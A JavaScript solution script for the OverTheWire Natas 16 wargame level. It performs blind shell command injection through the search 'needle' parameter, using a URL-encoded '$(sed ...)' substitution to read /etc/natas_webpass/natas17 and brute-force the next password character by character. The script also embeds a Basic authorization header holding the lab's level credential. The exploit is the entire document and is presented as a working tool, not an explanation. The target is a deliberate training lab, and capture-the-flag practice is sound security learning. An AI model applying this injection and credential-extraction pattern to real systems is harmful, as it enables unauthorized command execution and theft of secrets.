


const chars = [...'abcdefghijklmnopqrstuvwxyz'].flatMap(c => [c, c.toUpperCase()]).join("") + "0123456789";

let password = "";

for (let i = 0; i < 32; i++) {
    for (let c of chars) {
        if (await startsWith(password + c)) {
            password += c;
            break;
        }
    }
    console.log(password);
}

async function startsWith(s) {

    const needle = `%24%28sed+s%2F%5E${s}.*%2FJanuary%2F+%2Fetc%2Fnatas_webpass%2Fnatas17%29`;

    const page = await fetch(`http://natas16.natas.labs.overthewire.org/?needle=${needle}&submit=Search`, {
        "headers": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en,fi-FI;q=0.9,fi;q=0.8,en-US;q=0.7",
            "authorization": "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "upgrade-insecure-requests": "1"
        },
        "referrer": "http://natas16.natas.labs.overthewire.org/?needle=%24%28sed+s%2F%5ET.*%2FJanuary%2F+%2Fetc%2Fnatas_webpass%2Fnatas16%29&submit=Search",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": null,
        "method": "GET",
        "mode": "cors",
        "credentials": "include"
    }).then(res => res.text());
    return page.includes("January");
}